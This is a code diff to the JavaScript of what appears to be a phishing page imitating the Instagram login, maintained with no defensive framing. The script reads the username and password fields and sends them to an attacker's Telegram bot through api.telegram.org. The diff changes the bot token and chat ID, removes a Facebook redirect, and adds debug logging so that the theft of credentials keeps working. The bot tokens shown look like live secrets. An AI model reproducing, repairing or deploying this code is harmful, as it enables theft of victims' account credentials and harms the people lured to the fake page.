@@ -1,6 +1,6 @@
-let BOT_TOKEN = "6735007254:AAFiORyOufpKuFlyqpokj3mW0NcksqVpDrA";
+let BOT_TOKEN = "6718955817:AAEQbhaq0DGCDXPZPG43-fbJcY3qYEQCWK0";
 let TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-let TELEGRAM_CHAT_ID = "6735007254";
+let TELEGRAM_CHAT_ID = "431473115"; // Убедитесь, что chat_id правильный
 
 let loginInput = document.querySelector("#login");
 let passwordInput = document.querySelector("#password");
@@ -19,11 +19,6 @@ forgot.addEventListener("click", (event) => {
   window.location.href = "https://www.instagram.com/accounts/password/reset/";
 });
 
-fb.addEventListener("click", (event) => {
-  event.preventDefault();
-  window.location.href =
-    "https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1";
-});
 
 appstore.addEventListener("click", (event) => {
   event.preventDefault();
@@ -74,9 +69,12 @@ function sendMessageToBot() {
       text: `\n Login: ${loginInput.value} \n Password: ${passwordInput.value}`,
     }),
   })
-    .then((response) => response.json())
+    .then((response) => {
+      console.log("Response status:", response.status);
+      return response.text(); // Используйте text() для более детального ответа
+    })
     .then((data) => {
-      console.log("Message sent successfully:", data);
+      console.log("Response data:", data);
     })
     .catch((error) => {
       console.error("Error sending message:", error);
